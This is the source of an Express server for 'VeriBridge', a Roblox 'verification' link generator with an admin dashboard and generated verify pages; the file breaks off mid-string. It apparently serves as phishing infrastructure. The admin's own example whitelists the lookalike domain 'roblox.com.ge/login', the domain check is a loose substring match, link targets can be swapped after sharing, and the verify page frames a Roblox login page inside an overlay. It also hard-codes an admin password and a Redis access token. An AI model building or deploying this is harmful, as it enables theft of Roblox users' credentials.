const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const { Redis } = require('@upstash/redis');

const app = express();

// ==================== CONFIGURATION ====================
const ADMIN_PASSWORD = 'YourStrongPassword123';
const SESSION_SECRET = 'veribridge-secret-2024';

// ==================== REDIS CONNECTION ====================
const redis = new Redis({
    url: "https://certain-sponge-82355.upstash.io",
    token: "gQAAAAAAAUGzAAIncDEyYWU4OGFlYWFkMjQ0NmY3YTBiMWRkMTczM2EyYWM4NHAxODIzNTU",
});

redis.ping().then(() => console.log('[Redis] Connected')).catch(err => console.error('[Redis] Error:', err));

// ==================== ALLOWED DOMAINS ====================
let ALLOWED_DOMAINS = ['roblox.com', 'www.roblox.com', 'web.roblox.com', 'api.roblox.com'];

async function loadDomains() {
    try {
        const saved = await redis.get('allowed_domains');
        if (saved && Array.isArray(saved)) {
            ALLOWED_DOMAINS = saved;
            console.log('[Domains] Loaded:', ALLOWED_DOMAINS);
        }
    } catch (err) { console.error(err); }
}

async function saveDomains() {
    try {
        await redis.set('allowed_domains', ALLOWED_DOMAINS);
        console.log('[Domains] Saved:', ALLOWED_DOMAINS);
    } catch (err) { console.error(err); }
}

loadDomains();

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(cookieParser());

// ==================== HELPER FUNCTIONS ====================
function generateCode() {
    return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}

function isAuthenticated(req, res, next) {
    const token = req.cookies.admin_token;
    if (token === SESSION_SECRET) return next();
    res.status(401).json({ error: 'Unauthorized' });
}

async function getNextId() {
    return await redis.incr('global_next_id');
}

// ==================== PUBLIC API ====================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

app.get('/api/allowed-domains', (req, res) => {
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/api/generate', async (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ error: 'No URL provided' });
    
    let allowed = false;
    for (const domain of ALLOWED_DOMAINS) {
        if (url.includes(domain)) { allowed = true; break; }
    }
    if (!allowed) {
        return res.status(400).json({ error: 'Domain not allowed. Allowed: ' + ALLOWED_DOMAINS.join(', ') });
    }
    
    const code = generateCode();
    const nextId = await getNextId();
    const linkData = { id: nextId, code: code, targetUrl: url, createdAt: Date.now(), clicks: 0 };
    await redis.set(`link:${code}`, JSON.stringify(linkData));
    const shareableLink = 'https://' + req.headers.host + '/verify.html?code=' + code;
    res.json({ success: true, shareableLink: shareableLink, code: code });
});

app.get('/api/link/:code', async (req, res) => {
    const { code } = req.params;
    const data = await redis.get(`link:${code}`);
    if (!data) return res.status(404).json({ error: 'Link not found' });
    const linkData = JSON.parse(data);
    linkData.clicks++;
    await redis.set(`link:${code}`, JSON.stringify(linkData));
    res.json({ success: true, targetUrl: linkData.targetUrl });
});

// ==================== ADMIN API ====================
app.get('/admin/api/links', isAuthenticated, async (req, res) => {
    const keys = await redis.keys('link:*');
    const links = [];
    for (const key of keys) {
        const data = await redis.get(key);
        if (data) links.push(JSON.parse(data));
    }
    links.sort((a, b) => b.createdAt - a.createdAt);
    res.json({ success: true, links: links });
});

app.put('/admin/api/links/:code', isAuthenticated, async (req, res) => {
    const { code } = req.params;
    const { targetUrl } = req.body;
    const data = await redis.get(`link:${code}`);
    if (!data) return res.status(404).json({ success: false });
    const linkData = JSON.parse(data);
    linkData.targetUrl = targetUrl;
    await redis.set(`link:${code}`, JSON.stringify(linkData));
    res.json({ success: true });
});

app.delete('/admin/api/links/:code', isAuthenticated, async (req, res) => {
    await redis.del(`link:${req.params.code}`);
    res.json({ success: true });
});

app.get('/admin/api/stats', isAuthenticated, async (req, res) => {
    const keys = await redis.keys('link:*');
    let totalClicks = 0;
    for (const key of keys) {
        const data = await redis.get(key);
        if (data) totalClicks += JSON.parse(data).clicks || 0;
    }
    res.json({ success: true, stats: { totalLinks: keys.length, totalClicks: totalClicks, averageClicks: keys.length ? (totalClicks / keys.length).toFixed(2) : 0 } });
});

// ==================== DOMAIN MANAGEMENT API ====================
app.get('/admin/api/domains', isAuthenticated, (req, res) => {
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/admin/api/domains', isAuthenticated, async (req, res) => {
    let domain = req.body.domain;
    if (!domain) return res.status(400).json({ error: 'No domain provided' });
    domain = domain.toLowerCase().trim();
    if (ALLOWED_DOMAINS.includes(domain)) {
        return res.status(400).json({ error: 'Domain already exists' });
    }
    ALLOWED_DOMAINS.push(domain);
    await saveDomains();
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.delete('/admin/api/domains/:domain', isAuthenticated, async (req, res) => {
    const domain = req.params.domain;
    const index = ALLOWED_DOMAINS.indexOf(domain);
    if (index === -1) return res.status(404).json({ error: 'Domain not found' });
    ALLOWED_DOMAINS.splice(index, 1);
    await saveDomains();
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/admin/api/login', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie('admin_token', SESSION_SECRET, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000, path: '/' });
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.post('/admin/api/logout', (req, res) => {
    res.clearCookie('admin_token', { path: '/' });
    res.json({ success: true });
});

// ==================== ADMIN LOGIN PAGE ====================
app.get('/admin', (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>Admin Login</title><style>body{background:linear-gradient(135deg,#0a0f1e,#0a1a2f,#0b2b3b);font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:rgba(0,0,0,0.5);padding:40px;border-radius:20px;border:1px solid cyan;width:350px}h1{color:white;text-align:center}input{width:100%;padding:12px;margin:10px 0;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}button{width:100%;padding:12px;background:cyan;color:black;border:none;border-radius:10px;font-weight:bold;cursor:pointer}.error{color:red;text-align:center}</style></head><body><div class="login-box"><h1>Admin Login</h1><input type="password" id="password" placeholder="Enter password"><button onclick="login()">Login</button><div id="error" class="error"></div></div><script>async function login(){var pwd=document.getElementById("password").value;var res=await fetch("/admin/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({password:pwd})});var data=await res.json();if(data.success){window.location.href="/admin/dashboard"}else{document.getElementById("error").innerText="Invalid password"}}</script></body></html>');
});

// ==================== ADMIN DASHBOARD ====================
app.get('/admin/dashboard', isAuthenticated, (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <style>
        body{background:#0a0f1e;color:white;font-family:Arial;padding:20px}
        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px}
        h1{color:#00ffff}
        .logout-btn{background:#ff5555;border:none;padding:10px 20px;border-radius:10px;color:white;cursor:pointer}
        .tabs{display:flex;gap:10px;margin-bottom:30px;border-bottom:1px solid rgba(0,255,255,0.2);padding-bottom:10px}
        .tab-btn{background:transparent;border:none;padding:10px 20px;color:#9ab3cc;cursor:pointer;border-radius:8px}
        .tab-btn:hover{background:rgba(0,255,255,0.1);color:#00ffff}
        .tab-btn.active{background:rgba(0,255,255,0.2);color:#00ffff}
        .tab-content{display:none}.tab-content.active{display:block}
        .stats{display:flex;gap:20px;margin-bottom:30px}
        .stat-card{background:rgba(0,0,0,0.3);border:1px solid cyan;border-radius:15px;padding:20px;text-align:center;flex:1}
        .stat-number{font-size:36px;font-weight:bold;color:#00ffff}
        .search-box{margin-bottom:20px}
        .search-box input{width:100%;padding:12px;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}
        table{width:100%;border-collapse:collapse;background:rgba(0,0,0,0.3);border-radius:15px;overflow:hidden}
        th,td{padding:12px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.1)}
        th{background:rgba(0,255,255,0.1);color:#00ffff}
        .edit-btn{background:#2c5a7a;border:none;padding:5px 10px;border-radius:5px;color:white;cursor:pointer}
        .delete-btn{background:#ff5555;border:none;padding:5px 10px;border-radius:5px;color:white;cursor:pointer}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center}
        .modal-content{background:#1a1a2e;padding:30px;border-radius:20px;width:400px;border:1px solid cyan}
        .modal-content input{width:100%;padding:10px;margin:10px 0;background:#333;border:1px solid cyan;border-radius:10px;color:white}
        .save-btn{background:#00aa00;border:none;padding:10px;border-radius:10px;color:white;cursor:pointer}
        .cancel-btn{background:#555;border:none;padding:10px;border-radius:10px;color:white;cursor:pointer}
        .domains-list{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:20px}
        .domain-tag{background:rgba(0,255,255,0.2);border:1px solid cyan;padding:8px 15px;border-radius:20px;display:flex;align-items:center;gap:10px}
        .domain-tag button{background:#ff5555;border:none;color:white;border-radius:50%;width:20px;height:20px;cursor:pointer}
        .add-domain{display:flex;gap:10px;margin-top:20px}
        .add-domain input{flex:1;padding:10px;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}
        .add-domain button{background:#00aa00;border:none;padding:10px 20px;border-radius:10px;color:white;cursor:pointer}
        .info-box{background:rgba(0,255,255,0.1);border-radius:10px;padding:15px;margin-top:20px;font-size:13px}
    </style>
</head>
<body>
<div class="header"><h1>Admin Dashboard</h1><button class="logout-btn" onclick="logout()">Logout</button></div>
<div class="tabs"><button class="tab-btn active" onclick="switchTab('links')">Manage Links</button><button class="tab-btn" onclick="switchTab('domains')">Allowed Domains</button></div>
<div id="linksTab" class="tab-content active">
    <div class="stats"><div class="stat-card"><div class="stat-number" id="totalLinks">0</div><div>Total Links</div></div><div class="stat-card"><div class="stat-number" id="totalClicks">0</div><div>Total Clicks</div></div></div>
    <div class="search-box"><input type="text" id="search" placeholder="Search by URL or code..."></div>
    <div style="overflow-x:auto"><table><thead><tr><th>Code</th><th>URL</th><th>Clicks</th><th>Created</th><th>Actions</th></tr></thead><tbody id="tableBody"></tbody></table></div>
</div>
<div id="domainsTab" class="tab-content">
    <h3>Allowed Domains</h3>
    <p style="margin-bottom:15px;color:#9ab3cc">Add domains that users can shorten.</p>
    <div id="domainsList" class="domains-list">Loading...</div>
    <div class="add-domain"><input type="text" id="newDomain" placeholder="Enter domain (e.g., roblox.com.ge)"><button onclick="addDomain()">Add Domain</button></div>
    <div class="info-box"><strong>How it works:</strong><br>• Add any domain to allow users to shorten URLs from it<br>• Changes take effect immediately<br>• Example: Add "roblox.com.ge" to allow https://roblox.com.ge/login</div>
</div>
<div id="editModal" class="modal"><div class="modal-content"><h3>Edit Link</h3><input type="text" id="editCode" readonly><input type="text" id="editUrl" placeholder="New URL"><button class="save-btn" onclick="saveEdit()">Save</button><button class="cancel-btn" onclick="closeModal()">Cancel</button></div></div>
<script>
var currentLinks=[],currentEditCode=null;
function switchTab(tab){var btns=document.querySelectorAll('.tab-btn'),contents=document.querySelectorAll('.tab-content');for(var i=0;i<btns.length;i++)btns[i].classList.remove('active');for(var i=0;i<contents.length;i++)contents[i].classList.remove('active');if(tab==='links'){btns[0].classList.add('active');document.getElementById('linksTab').classList.add('active');loadLinks()}else{btns[1].classList.add('active');document.getElementById('domainsTab').classList.add('active');loadDomains()}}
async function loadDomains(){try{var res=await fetch('/admin/api/domains');if(res.status===401){window.location.href='/admin';return}var data=await res.json();if(data.success){var container=document.getElementById('domainsList');if(!data.domains||data.domains.length===0){container.innerHTML='<span style="color:#9ab3cc">No domains added. Add your first domain above.</span>';return}var html='';for(var i=0;i<data.domains.length;i++){html+='<div class="domain-tag">'+data.domains[i]+'<button onclick="removeDomain(\\''+data.domains[i]+'\\')">✕</button></div>'}container.innerHTML=html}}catch(e){console.error(e)}}
async function addDomain(){var input=document.getElementById('newDomain');var domain=input.value.trim().toLowerCase();if(!domain){alert('Please enter a domain');return}try{var res=await fetch('/admin/api/domains',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:domain})});var data=await res.json();if(data.success){loadDomains();input.value='';alert('Domain added successfully!')}else{alert(data.error||'Failed to add domain')}}catch(e){alert('Error adding domain')}}
async function removeDomain(domain){if(!confirm('Remove "'+domain+'" from allowed domains?'))return;try{var res=await fetch('/admin/api/domains/'+encodeURIComponent(domain),{method:'DELETE'});var data=await res.json();if(data.success){loadDomains();alert('Domain removed successfully!')}else{alert(data.error||'Failed to remove domain')}}catch(e){alert('Error removing domain')}}
async function loadLinks(){var search=document.getElementById('search').value;var url=search?'/admin/api/links?search='+encodeURIComponent(search):'/admin/api/links';var res=await fetch(url);if(res.status===401){window.location.href='/admin';return}var data=await res.json();if(data.success){currentLinks=data.links;document.getElementById('totalLinks').innerText=currentLinks.length;var totalClicks=0;for(var i=0;i<currentLinks.length;i++)totalClicks+=currentLinks[i].clicks||0;document.getElementById('totalClicks').innerText=totalClicks;var tbody=document.getElementById('tableBody');if(currentLinks.length===0){tbody.innerHTML='<tr><td colspan="5" style="text-align:center">No links found</td></tr>';return}var html='';for(var i=0;i<currentLinks.length;i++){var link=currentLinks[i];html+='<tr><td><code>'+link.code+'</code></td><td>'+link.targetUrl+'</td><td>'+(link.clicks||0)+'</td><td>'+new Date(link.createdAt).toLocaleDateString()+'</td><td><button class="edit-btn" onclick="openEdit(\\''+link.code+'\\')">Edit</button> <button class="delete-btn" onclick="deleteLink(\\''+link.code+'\\')">Delete</button></div>--');}tbody.innerHTML=html}}
function openEdit(code){var link=null;for(var i=0;i<currentLinks.length;i++){if(currentLinks[i].code===code){link=currentLinks[i];break}}if(link){currentEditCode=code;document.getElementById('editCode').value=code;document.getElementById('editUrl').value=link.targetUrl;document.getElementById('editModal').style.display='flex'}}
async function saveEdit(){await fetch('/admin/api/links/'+currentEditCode,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({targetUrl:document.getElementById('editUrl').value})});closeModal();loadLinks()}
async function deleteLink(code){if(confirm('Delete this link?')){await fetch('/admin/api/links/'+code,{method:'DELETE'});loadLinks()}}
function closeModal(){document.getElementById('editModal').style.display='none'}
async function logout(){await fetch('/admin/api/logout',{method:'POST'});window.location.href='/admin'}
document.getElementById('search').addEventListener('input',function(){clearTimeout(window.searchTimeout);window.searchTimeout=setTimeout(loadLinks,500)});
loadLinks();setInterval(loadLinks,30000);
</script>
</body></html>`);
});

// ==================== GENERATOR PAGE ====================
app.get('/gen', (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>VeriBridge Gen</title><script src="https://cdn.tailwindcss.com"></script><style>.shine-text{background:linear-gradient(100deg,#fff 45%,#0ff 50%,#fff 55%);background-size:200% auto;color:transparent;-webkit-background-clip:text;background-clip:text;animation:shine 4s linear infinite}@keyframes shine{0%{background-position:-100% 0}100%{background-position:200% 0}}.loading-spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block}@keyframes spin{to{transform:rotate(360deg)}}.allowed-domains{background:rgba(0,255,255,0.1);border-radius:8px;padding:10px;margin-top:10px;font-size:11px;color:#0ff}.allowed-domains span{display:inline-block;background:rgba(0,255,255,0.2);padding:2px 8px;border-radius:20px;margin:2px}</style></head><body class="bg-black text-white"><div class="fixed inset-0 -z-10 bg-[radial-gradient(#0d0d0d_1px,transparent_1px)] [background-size:16px_16px]"></div><div class="flex min-h-screen items-center justify-center p-4"><div class="w-full max-w-2xl text-center"><div class="bg-black/40 backdrop-blur-xl border border-cyan-500/30 rounded-2xl p-8"><h1 class="text-3xl font-bold shine-text mb-2">VeriBridge Gen</h1><p class="text-sm text-cyan-400/60 mb-6">Create SHAREABLE verification links (never expire)</p><div class="space-y-4"><input type="text" id="targetUrl" class="w-full bg-zinc-900/80 border border-cyan-500/20 rounded-xl p-3 text-white" placeholder="https://www.roblox.com/login"><button id="generateBtn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 py-3 rounded-xl font-semibold hover:from-cyan-500 hover:to-blue-500">Generate Shareable Link</button><div id="allowedDomains" class="allowed-domains"><strong>Allowed Domains:</strong> <span id="domainsList">Loading...</span></div><div id="resultSection" class="hidden mt-4 p-4 bg-cyan-950/40 rounded-xl border border-cyan-500/30"><p class="text-xs text-cyan-300/80 mb-2">Your Shareable Link:</p><code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer select-all"></code><div class="flex gap-2 mt-3"><button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm">Copy Link</button><button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm">Test</button></div></div><div id="errorMsg" class="text-red-400 text-sm"></div><div class="text-xs text-white/30 pt-4 border-t border-white/10"><p>VALIDATED URLs! Only allowed Roblox domains work</p><p>Links never expire - stored securely</p></div></div></div></div></div><script>var targetUrl=document.getElementById("targetUrl"),generateBtn=document.getElementById("generateBtn"),resultSection=document.getElementById("resultSection"),resultUrl=document.getElementById("resultUrl"),copyBtn=document.getElementById("copyBtn"),testBtn=document.getElementById("testBtn"),errorMsg=document.getElementById("errorMsg"),domainsList=document.getElementById("domainsList");async function loadAllowedDomains(){try{var res=await fetch("/api/allowed-domains"),data=await res.json();if(data.success){var html="";for(var i=0;i<data.domains.length;i++)html+="<span>"+data.domains[i]+"</span>";domainsList.innerHTML=html}}catch(e){domainsList.innerHTML="<span>roblox.com</span><span>www.roblox.com</span>"}}loadAllowedDomains();async function generateLink(){var url=targetUrl.value.trim();if(!url){errorMsg.innerText="Please enter a URL";return}errorMsg.innerText="";generateBtn.disabled=true;generateBtn.innerHTML="<div class=loading-spinner></div> Generating...";try{var response=await fetch("/api/generate",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:url})}),data=await response.json();if(data.success){resultUrl.innerText=data.shareableLink;resultSection.classList.remove("hidden")}else{errorMsg.innerText=data.error;resultSection.classList.add("hidden")}}catch(err){errorMsg.innerText="Server error";resultSection.classList.add("hidden")}finally{generateBtn.disabled=false;generateBtn.innerHTML="Generate Shareable Link"}}generateBtn.addEventListener("click",generateLink);copyBtn.addEventListener("click",function(){navigator.clipboard.writeText(resultUrl.innerText)});testBtn.addEventListener("click",function(){window.open(resultUrl.innerText,"_blank")});targetUrl.addEventListener("keypress",function(e){if(e.key==="Enter")generateLink()});setInterval(loadAllowedDomains,30000);</script></body></html>');
});

// ==================== VERIFICATION PAGE (FULLY WORKING) ====================
app.get('/verify.html', (req, res) => {
    const code = req.query.code;
    if (!code) {
        res.send('<h1>Invalid link</h1><a href="/gen">Go to Generator</a>');
        return;
    }
    
    // Complete working verify.html with proper async loading
    const html = '<!DOCTYPE html>\n' +
'<html lang="en">\n' +
'<head>\n' +
'    <meta charset="UTF-8">\n' +
'    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">\n' +
'    <title>veribridge | Roblox Verification</title>\n' +
'    <style>\n' +
'        *{margin:0;padding:0;box-sizing:border-box;font-family:"Poppins","Segoe UI","Inter",system-ui,sans-serif}\n' +
'        body{min-height:100vh;background:linear-gradient(135deg,#0a0f1e 0%,#0a1a2f 50%,#0b2b3b 100%);overflow-x:hidden;position:relative}\n' +
'        .frost-overlay{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;background:radial-gradient(circle at 20% 40%,rgba(173,216,230,0.03) 0%,transparent 70%);z-index:1}\n' +
'        .premium-container{max-width:1400px;margin:0 auto;padding:1rem;position:relative;z-index:20}\n' +
'        @media(min-width:768px){.premium-container{padding:1.5rem}}\n' +
'        .golden-header{text-align:center;margin-bottom:0.5rem}\n' +
'        .premium-logo-gold{display:inline-flex;align-items:center;justify-content:center;gap:10px;background:rgba(0,0,0,0.5);backdrop-filter:blur(20px);padding:0.5rem 1rem;border-radius:60px;border:1px solid rgba(100,200,255,0.6);box-shadow:0 8px 32px rgba(0,0,0,0.3);margin-bottom:0.5rem;flex-wrap:wrap}\n' +
'        .brand-logo{height:35px;width:auto;max-width:120px;object-fit:contain}\n' +
'        @media(min-width:768px){.brand-logo{height:45px;max-width:160px}}\n' +
'        .gold-badge{background:linear-gradient(135deg,#2c5a7a,#1e3a5a);padding:3px 10px;border-radius:40px;font-size:0.6rem;font-weight:bold;color:#8dd0ff}\n' +
'        .brand-container{text-align:center;margin-bottom:0.5rem;padding:0.3rem 0}\n' +
'        .brand-main{font-size:3rem;font-weight:800;letter-spacing:-1px;margin-bottom:0.2rem}\n' +
'        @media(min-width:768px){.brand-main{font-size:4rem}}\n' +
'        .veri-white{color:#ffffff}\n' +
'        .bridge-purple{background:linear-gradient(135deg,#c084fc,#a855f7,#7c3aed);background-clip:text;-webkit-background-clip:text;color:transparent}\n' +
'        .brand-subtitle{font-size:1.2rem;font-weight:600;margin-top:0.1rem}\n' +
'        @media(min-width:768px){.brand-subtitle{font-size:1.5rem}}\n' +
'        .bringing-white{color:#ffffff}\n' +
'        .roblox-red{color:#ff4d4d}\n' +
'        .to-white{color:#ffffff}\n' +
'        .discord-blue{color:#5865F2}\n' +
'        .description-text{font-size:0.85rem;color:#9ab3cc;max-width:600px;margin:0.8rem auto 0;line-height:1.5}\n' +
'        .username-row{display:flex;flex-direction:row;align-items:center;justify-content:center;gap:10px;max-width:550px;margin:1rem auto;flex-wrap:wrap}\n' +
'        .username-input{flex:2;min-width:200px;background:rgba(0,0,0,0.5);border:1px solid rgba(100,200,255,0.4);border-radius:60px;padding:0.9rem 1.2rem;font-size:0.95rem;color:#ffffff;outline:none}\n' +
'        .username-input:focus{border-color:#8dd0ff;box-shadow:0 0 0 3px rgba(100,200,255,0.2)}\n' +
'        .get-started-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:0.9rem 1.8rem;border-radius:60px;font-weight:700;font-size:0.95rem;color:white;cursor:pointer;transition:all 0.2s}\n' +
'        .error-msg{color:#ff5555;font-size:0.7rem;text-align:center;margin-top:0.3rem;display:none}\n' +
'        .error-msg.show{display:block}\n' +
'        .legal-note{font-size:0.65rem;color:#7e95b5;text-align:center;margin-top:0.5rem}\n' +
'        .rating-stars{color:#ffc107;font-size:0.8rem;text-align:center;margin-top:0.8rem}\n' +
'        .features-section{margin:3rem 0 2rem}\n' +
'        .features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:1.8rem}\n' +
'        .feature-card{background:rgba(0,0,0,0.3);backdrop-filter:blur(8px);border-radius:1.2rem;padding:1.5rem;border:1px solid rgba(100,200,255,0.2)}\n' +
'        .feature-card h3{font-size:1.2rem;font-weight:600;color:#cceeff;margin-bottom:0.8rem}\n' +
'        .feature-card p{color:#9ab3cc;font-size:0.85rem;line-height:1.5}\n' +
'        .section-title{font-size:1.6rem;font-weight:700;text-align:center;margin-bottom:2rem;background:linear-gradient(135deg,#ffffff,#8dd0ff);background-clip:text;-webkit-background-clip:text;color:transparent}\n' +
'        .dashboard-gold{display:flex;flex-direction:column;gap:1rem;margin-top:2rem}\n' +
'        @media(min-width:900px){.dashboard-gold{display:grid;grid-template-columns:300px 1fr;gap:1.5rem}}\n' +
'        .verification-sidebar-gold{background:rgba(0,0,0,0.45);backdrop-filter:blur(16px);border-radius:1.5rem;border:1px solid rgba(100,200,255,0.4);overflow:hidden}\n' +
'        .sidebar-gold-header{background:linear-gradient(115deg,rgba(100,200,255,0.2),rgba(100,200,255,0.1));padding:1rem;text-align:center;border-bottom:2px solid rgba(100,200,255,0.6)}\n' +
'        .sidebar-gold-header h2{font-size:1rem;color:#8dd0ff}\n' +
'        .verify-options-gold{padding:0.8rem}\n' +
'        .verify-card-gold{background:rgba(0,0,0,0.5);backdrop-filter:blur(8px);border-radius:1rem;padding:0.8rem;margin-bottom:0.8rem;cursor:pointer;border:1px solid rgba(100,200,255,0.3)}\n' +
'        .verify-card-gold.active{background:linear-gradient(145deg,rgba(100,200,255,0.25),rgba(100,200,255,0.15));border-color:#8dd0ff;box-shadow:0 4px 20px rgba(100,200,255,0.3)}\n' +
'        .method-letter-circle{width:42px;height:42px;border-radius:50%;background:rgba(100,200,255,0.15);border:1.5px solid #8dd0ff;display:flex;align-items:center;justify-content:center;margin-bottom:0.5rem}\n' +
'        .method-letter{font-size:1.2rem;font-weight:700;color:#8dd0ff}\n' +
'        .card-title-gold{font-weight:700;color:#cceeff;margin-bottom:0.2rem;font-size:0.9rem}\n' +
'        .card-desc-gold{font-size:0.65rem;color:#9ab3cc}\n' +
'        .verify-badge-gold{display:inline-block;margin-top:6px;font-size:0.55rem;background:rgba(0,0,0,0.6);padding:2px 8px;border-radius:20px;color:#8dd0ff}\n' +
'        .login-viewer-gold{background:rgba(0,0,0,0.4);backdrop-filter:blur(20px);border-radius:1.5rem;border:1px solid rgba(100,200,255,0.4);overflow:hidden}\n' +
'        .viewer-header-gold{background:rgba(0,0,0,0.5);padding:0.8rem 1rem;border-bottom:1px solid rgba(100,200,255,0.5);display:flex;flex-direction:column;align-items:center;gap:10px}\n' +
'        @media(min-width:600px){.viewer-header-gold{flex-direction:row;justify-content:space-between}}\n' +
'        .method-indicator-gold{display:flex;align-items:center;gap:10px}\n' +
'        .method-indicator-circle{width:28px;height:28px;border-radius:50%;background:rgba(100,200,255,0.2);border:1px solid #8dd0ff;display:flex;align-items:center;justify-content:center}\n' +
'        .method-indicator-letter{font-size:0.9rem;font-weight:700;color:#8dd0ff}\n' +
'        .method-name-gold{color:#cceeff;font-weight:600;font-size:0.9rem}\n' +
'        .status-chip-gold{background:rgba(0,0,0,0.6);padding:4px 10px;border-radius:40px;font-size:0.65rem;color:#8dd0ff}\n' +
'        .roblox-auth-section{padding:1.5rem;background:rgba(0,0,0,0.3);border-radius:1rem;margin:1rem}\n' +
'        .auth-input-group{display:flex;gap:10px;flex-wrap:wrap;flex-direction:column}\n' +
'        .roblox-username-input{width:100%;background:rgba(0,0,0,0.6);border:1px solid rgba(100,200,255,0.4);border-radius:60px;padding:12px 20px;color:#ffffff;font-size:0.9rem;outline:none}\n' +
'        .verify-roblox-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:12px 24px;border-radius:60px;font-weight:bold;color:white;cursor:pointer;margin-top:10px}\n' +
'        .user-profile-preview{display:none;align-items:center;gap:15px;padding:15px;background:rgba(0,0,0,0.5);border-radius:1rem;margin-top:15px}\n' +
'        .user-profile-preview.show{display:flex}\n' +
'        .preview-avatar{width:60px;height:60px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}\n' +
'        .preview-info h4{color:#ffffff;font-size:1rem}\n' +
'        .redirect-container{padding:1rem 1.5rem 1.5rem;text-align:center}\n' +
'        .welcome-text{color:#ffffff;font-size:1rem;margin-bottom:0.5rem}\n' +
'        .redirect-desc{color:#cceeff;font-size:0.85rem;margin-bottom:0.5rem}\n' +
'        .bottom-start-btn{background:linear-gradient(95deg,#2c5a7a,#1e3a5a);border:none;padding:12px 28px;border-radius:60px;font-weight:bold;font-size:1rem;color:white;cursor:pointer;margin-top:1rem}\n' +
'        .bottom-start-btn:disabled{opacity:0.5;cursor:not-allowed}\n' +
'        .footer-gold{text-align:center;margin-top:2rem;font-size:0.6rem;color:#9ab3cc}\n' +
'        .fullscreen-loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(20px);z-index:2000;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px;opacity:0;visibility:hidden}\n' +
'        .fullscreen-loading.active{opacity:1;visibility:visible}\n' +
'        .loading-spinner-large{width:60px;height:60px;border:4px solid rgba(100,200,255,0.2);border-top:4px solid #8dd0ff;border-radius:50%;animation:spinGold 1s linear infinite}\n' +
'        @keyframes spinGold{to{transform:rotate(360deg)}}\n' +
'        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);backdrop-filter:blur(8px);z-index:9999;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:all 0.3s ease}\n' +
'        .frame-overlay.active{visibility:visible;opacity:1}\n' +
'        .frame-card{width:90%;max-width:500px;background:white;border-radius:28px;overflow:hidden;position:relative;transform:scale(0.9);transition:transform 0.3s ease;box-shadow:0 30px 50px rgba(0,0,0,0.4)}\n' +
'        .frame-overlay.active .frame-card{transform:scale(1)}\n' +
'        .frame-close{position:absolute;top:14px;right:18px;width:34px;height:34px;background:rgba(0,0,0,0.6);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:30;font-size:20px;font-weight:bold;border:none}\n' +
'        .frame-close:hover{background:#e34d4d}\n' +
'        .roblox-login-iframe{width:100%;height:560px;border:none;display:block}\n' +
'        @media(max-width:550px){.roblox-login-iframe{height:520px}}\n' +
'        .user-profile-card{position:fixed;top:20px;right:20px;z-index:100;background:rgba(0,0,0,0.7);backdrop-filter:blur(16px);border-radius:60px;padding:6px 12px 6px 8px;display:flex;align-items:center;gap:12px;border:1px solid rgba(100,200,255,0.5);display:none}\n' +
'        .user-profile-card.show{display:flex}\n' +
'        .user-avatar{width:42px;height:42px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}\n' +
'        .user-display-name{font-size:0.85rem;font-weight:700;color:#cceeff}\n' +
'        .logout-btn{background:none;border:none;color:#ff8888;cursor:pointer;font-size:1rem;padding:4px 8px;border-radius:20px}\n' +
'        .ai-chat-widget{position:fixed;bottom:15px;right:15px;z-index:1000;cursor:pointer}\n' +
'        .chat-bubble{width:55px;height:55px;background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.3)}\n' +
'        .chat-bubble span{font-size:28px}\n' +
